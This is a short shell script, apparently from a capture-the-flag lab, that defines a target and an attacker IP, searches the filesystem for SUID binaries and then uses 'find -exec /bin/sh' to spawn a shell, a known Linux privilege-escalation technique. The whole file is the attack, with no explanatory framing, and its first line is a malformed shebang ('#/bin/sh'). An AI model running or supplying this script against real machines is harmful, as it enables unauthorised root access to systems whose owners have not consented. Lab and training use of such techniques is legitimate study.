#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP
target_ip="10.10.59.15"
attack_ip="10.10.36.217"

# Prepare environment
mkdir /work/

# Look for SUID
find / -perm -4000 2>/dev/null

# Use find to escalate privileges
find . -exec /bin/sh \; -quit
